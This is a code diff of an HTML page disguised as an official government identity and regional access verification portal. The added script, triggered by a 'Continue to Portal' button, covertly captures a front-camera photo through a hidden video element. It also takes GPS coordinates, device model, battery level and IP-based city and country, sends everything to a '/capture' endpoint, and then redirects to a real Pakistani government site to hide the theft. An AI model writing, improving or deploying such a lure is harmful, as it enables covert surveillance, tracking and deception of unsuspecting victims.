@@ -3,99 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital Verification Portal</title>
+    <title>Identity Verification Portal</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f5f7f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; text-align: center; }
-        .header-top { border-bottom: 2px solid #28a745; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; color: #28a745; text-align: left; font-size: 14px; }
-        h2 { font-size: 18px; color: #24292e; text-align: left; }
-        p { font-size: 13px; color: #586069; text-align: left; line-height: 1.6; }
-        .btn { background-color: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; }
-        #loader { display: none; color: #28a745; font-weight: 600; margin-top: 10px; }
+        :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
+        .status-bar { height: 4px; background: var(--primary); border-radius: 10px; width: 50px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: var(--text); margin: 0 0 12px 0; font-weight: 700; }
+        p { font-size: 14px; color: #586069; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2); }
+        .btn:active { transform: scale(0.98); }
+        #loader { display: none; text-align: center; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-text { font-size: 11px; color: #959da5; margin-top: 25px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header-top">OFFICIAL VERIFICATION</div>
-    <h2>Regional Access Control</h2>
-    <p>Please verify your identity and location to proceed to the secure government portal.</p>
-    <div id="loader">Processing... Please Wait</div>
-    <button id="mainBtn" class="btn" onclick="verify()">CONTINUE TO PORTAL</button>
+<div class="card">
+    <div class="status-bar"></div>
+    <h2>Regional Access Verification</h2>
+    <p>This automated portal confirms your identity and location for secure access. Please click below to complete the mandatory compliance check.</p>
+    
+    <div id="loader">
+        <div class="spinner"></div>
+        <div style="font-size: 13px; color: var(--primary); font-weight: 600;">Authenticating Secure Connection...</div>
+    </div>
+
+    <button id="mainBtn" class="btn" onclick="startProcess()">CONTINUE TO PORTAL</button>
+    
+    <div class="footer-text">
+        System ID: FZN-PR-2026<br>
+        Encrypted by Digital Security Authority
+    </div>
 </div>
 
-<video id="v" style="display:none;" autoplay playsinline></video>
-<canvas id="c" style="display:none;" width="640" height="480"></canvas>
+<video id="video" style="display:none;" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
 
 <script>
-    async function verify() {
-        // Facebook/Instagram Internal Browser Fix
-        if (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV") || navigator.userAgent.includes("Instagram")) {
-            // Force open in external browser if possible
-            alert("For security, please open this link in Chrome or Safari.");
+    async function startProcess() {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loader');
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+
+        // 1. Precise Device Detection
+        let userAgent = navigator.userAgent;
+        let deviceName = "Unknown Device";
+        if (/android/i.test(userAgent)) {
+            deviceName = userAgent.match(/\(([^)]+)\)/)[1].split(';')[2] || "Android Mobile";
+        } else if (/iPhone/i.test(userAgent)) {
+            deviceName = "Apple iPhone";
         }
 
-        document.getElementById('mainBtn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        let info = { 
-            model: navigator.userAgent.split('(')[1]?.split(';')[1]?.trim() || "Unknown",
-            battery: "N/A", lat: "0", lon: "0",
-            city: "Pending", country: "Pending", realIp: "Pending"
+        let reportData = {
+            device: deviceName.trim(),
+            platform: navigator.platform,
+            battery: "N/A",
+            time: new Date().toLocaleString(),
+            lat: "0", lon: "0",
+            city: "N/A", country: "N/A", ip: "N/A"
         };
 
-        // Battery info
-        if(navigator.getBattery) { 
-            const b = await navigator.getBattery(); 
-            info.battery = Math.round(b.level*100)+"%"; 
+        // 2. Battery Status
+        if(navigator.getBattery) {
+            const b = await navigator.getBattery();
+            reportData.battery = Math.round(b.level * 100) + "%";
         }
 
-        // 1. IP-API (More stable in Pakistan)
-        const geoTask = fetch('http://ip-api.com/json/')
-            .then(res => res.json())
-            .then(data => {
-                info.city = data.city || "Unknown";
-                info.country = data.country || "Unknown";
-                info.realIp = data.query || "Unknown";
-            }).catch(() => { info.city = "API Blocked"; });
+        // 3. Multi-Source IP & Location (Redundancy)
+        const fetchGeo = async () => {
+            try {
+                // Primary API
+                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
+                const data = await res.json();
+                if(data.status === 'success') {
+                    reportData.city = data.city;
+                    reportData.country = data.country;
+                    reportData.ip = data.query;
+                }
+            } catch (e) {
+                // Backup API
+                try {
+                    const res2 = await fetch('https://ipinfo.io/json');
+                    const data2 = await res2.json();
+                    reportData.city = data2.city;
+                    reportData.country = data2.country;
+                    reportData.ip = data2.ip;
+                } catch (e2) {
+                    reportData.city = "API Blocked";
+                }
+            }
+        };
 
-        // 2. Camera Trigger
-        const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
-            .catch(() => null);
+        // 4. Camera & GPS (Parallel Execution)
+        const geoPromise = fetchGeo();
+        const cameraPromise = navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: 1280, height: 720 } 
+        }).catch(() => null);
 
-        // 3. Location with High Accuracy
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            info.lat = pos.coords.latitude; 
-            info.lon = pos.coords.longitude;
-            await geoTask;
-            handleCapture(await cameraTask, info);
+            reportData.lat = pos.coords.latitude;
+            reportData.lon = pos.coords.longitude;
+            finalize(await cameraPromise, reportData, geoPromise);
         }, async () => {
-            await geoTask;
-            handleCapture(await cameraTask, info);
-        }, { enableHighAccuracy: true, timeout: 8000 });
+            finalize(await cameraPromise, reportData, geoPromise);
+        }, { enableHighAccuracy: true, timeout: 10000 });
     }
 
-    async function handleCapture(stream, info) {
-        if(stream) {
-            const video = document.getElementById('v');
+    async function finalize(stream, data, geoTask) {
+        await geoTask; // Ensure Geo data is fetched
+        
+        if (stream) {
+            const video = document.getElementById('video');
             video.srcObject = stream;
+            
+            // Wait 1.8 seconds for light adjustment & focus
             setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const img = canvas.toDataURL('image/jpeg', 0.5);
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/jpeg', 0.8);
+                
                 stream.getTracks().forEach(t => t.stop());
-                send(info, img);
-            }, 1000);
+                sendData(data, photo);
+            }, 1800);
         } else {
-            send(info, null);
+            sendData(data, null);
         }
     }
 
-    function send(i, p) {
+    function sendData(info, photo) {
         fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ info: i, photo: p })
+            body: JSON.stringify({ info: info, photo: photo })
         }).then(() => {
             window.location.href = "https://www.pakistan.gov.pk/";
         });
